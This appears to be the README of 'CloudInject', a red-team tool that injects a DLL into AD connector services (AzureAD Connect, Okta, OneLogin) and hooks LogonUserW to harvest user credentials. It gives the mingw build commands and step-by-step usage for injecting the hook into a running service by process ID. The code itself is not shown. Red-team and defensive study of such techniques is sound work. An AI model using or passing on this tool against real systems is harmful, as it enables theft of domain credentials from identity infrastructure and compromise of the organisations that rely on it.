## CloudInject

This is a simple tool which can be used to inject a DLL into third-party AD connectors to harvest credentials.

This tool has been tested with:

* AzureAD Connect
* OKTA AD Connector
* OneLogin AD Connector

The API call hooked is `LogonUserW` which seems to be used by each AD Connector. 

More information can be found in the blog post [https://blog.xpnsec.com/identity-providers-redteamers/](https://blog.xpnsec.com/identity-providers-redteamers/).

## Building

To build, we can use Visual Studio, or use Mingw32 with:

```
x86_64-w64-mingw32-g++ Hooker/hooker.cpp -o Hooker/hooker.dll -static -shared
x86_64-w64-mingw32-g++ Injector/injector.cpp -o Injector/injector.dll -static
```

## Usage

To use this tool, simply save `hooker.dll` to a location which is readable by the AD Connector service. For example, `C:\Tools\hooker.dll` and then run:

```
Injector.exe [PID] [FULL DLL PATH]
```

For example:

```
Injector.exe 6100 C:\Tools\hooker.dll
```